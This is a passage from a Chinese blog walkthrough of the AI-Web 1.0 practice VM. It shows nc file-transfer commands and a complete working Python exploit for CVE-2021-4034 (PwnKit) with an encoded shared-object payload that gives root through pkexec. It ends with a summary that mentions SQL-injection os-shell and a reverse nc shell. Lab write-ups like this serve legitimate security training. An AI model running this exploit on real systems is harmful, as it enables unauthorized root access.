+<p>上传polkit.py脚本文件到靶机的&#x2F;tmp目录：</p>
+<p>通过nc命令来传输文件：</p>
+<p>接收机靶机：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvnp <span class="hljs-number">4444</span> &gt; polkit.py         <span class="hljs-regexp">//</span>开启监听端口， &gt; 后跟的是接收到文件放到生成的文件（polkit.py）中<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007103455833.png" srcset="/img/loading.gif" lazyload alt="image-20231007103455833"></p>
+<p>发送机kali：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.190.187</span> <span class="hljs-number">4444</span> &lt; polkit.py<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007103503312.png" srcset="/img/loading.gif" lazyload alt="image-20231007103503312"></p>
+<p>对提权脚本进行权限赋予：</p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007103609334.png" srcset="/img/loading.gif" lazyload alt="image-20231007103609334"></p>
+<p>执行脚本即可提权到root：</p>
+<p><img src="/2023/10/07/AI-Web1-0/image-20231007103659416.png" srcset="/img/loading.gif" lazyload alt="image-20231007103659416"></p>
+<p>提权脚本为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys</span><br><span class="hljs-comment"># hardcoded amd64 lib</span><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes.util <span class="hljs-keyword">import</span> find_library<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> tempfile<br><br>payload = zlib.decompress(<br>    base64.b64decode(<br>        <span class="hljs-string">&quot;&quot;&quot;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&quot;&quot;&quot;</span><br>    )<br>)<br>libc = CDLL(find_library(<span class="hljs-string">&quot;c&quot;</span>))<br>libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)<br>libc.execve.restype = c_ssize_t<br><br>wd = tempfile.mkdtemp()<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(payload)<br>os.mkdir(wd + <span class="hljs-string">&quot;/gconv/&quot;</span>)<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/gconv/gconv-modules&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(<br>    <span class="hljs-string">&quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;</span><br>)<br>os.mkdir(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>)<br>os.mknod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chdir(wd)<br>cmd = <span class="hljs-string">b&quot;/usr/bin/pkexec&quot;</span><br>argv = []<br>envp = [<br>    <span class="hljs-string">b&quot;gconv&quot;</span>,<br>    <span class="hljs-string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<br>    <span class="hljs-string">b&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,<br>    <span class="hljs-string">b&quot;XAUTHORITY=../gconv&quot;</span>,<br>    <span class="hljs-string">b&quot;&quot;</span>,<br>]<br><br>cargv = (c_char_p * (<span class="hljs-built_in">len</span>(argv) + <span class="hljs-number">1</span>))(*argv, <span class="hljs-literal">None</span>)<br>cenv = (c_char_p * (<span class="hljs-built_in">len</span>(envp) + <span class="hljs-number">1</span>))(*envp, <span class="hljs-literal">None</span>)<br>libc.execve(cmd, cargv, cenv)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-打靶总结："><a href="#4-打靶总结：" class="headerlink" title="4.打靶总结："></a>4.打靶总结：</h3><p>①：常规的信息收集，通过目录扫描获取后续的信息</p>
+<p>②：存在注入点使该网站存在危险，同时phpinfo页面暴露出网站的绝对路径导致–os-shell的成功建立（关掉phpinfo页面后会降低大量风险）</p>
+<p>③：通过创建管道命令来建立nc的远程连接，间接避开了nc -e不能直接使用</p>
+<p>④：提权方法多样化，说明存在多个漏洞</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>AI_Web1.0</div>
+      <div>http://example.com/2023/10/07/AI-Web1-0/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leigoshi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/19/seattle/" title="seattle">
+                        <span class="hidden-mobile">seattle</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
